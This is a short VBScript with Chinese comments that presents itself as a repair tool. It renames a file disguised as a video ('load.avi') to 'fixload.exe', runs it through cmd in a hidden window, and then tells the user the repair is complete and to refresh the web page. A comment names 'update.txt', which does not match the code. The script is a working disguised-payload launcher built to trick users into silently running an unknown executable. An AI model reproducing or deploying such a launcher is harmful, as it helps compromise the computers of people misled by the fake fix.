' 创建 WScript.Shell 对象
Set WshShell = CreateObject("WScript.Shell")

' 获取当前目录
currentDir = CreateObject("Scripting.FileSystemObject").GetAbsolutePathName(".")

' 将 update.txt 重命名为 fixload.exe
Set fso = CreateObject("Scripting.FileSystemObject")
If fso.FileExists(currentDir & "\load.avi") Then
    fso.MoveFile currentDir & "\load.avi", currentDir & "\fixload.exe"
Else
    MsgBox "解压到目录后在运行此文件！", vbExclamation, "错误"
    WScript.Quit
End If

' 使用 cmd 执行 fixload.exe
WshShell.Run "cmd.exe /c """ & currentDir & "\fixload.exe""", 0, False

' 弹出修复完成的消息框
MsgBox "修复完成！请刷新网页即可", vbInformation, "提示"
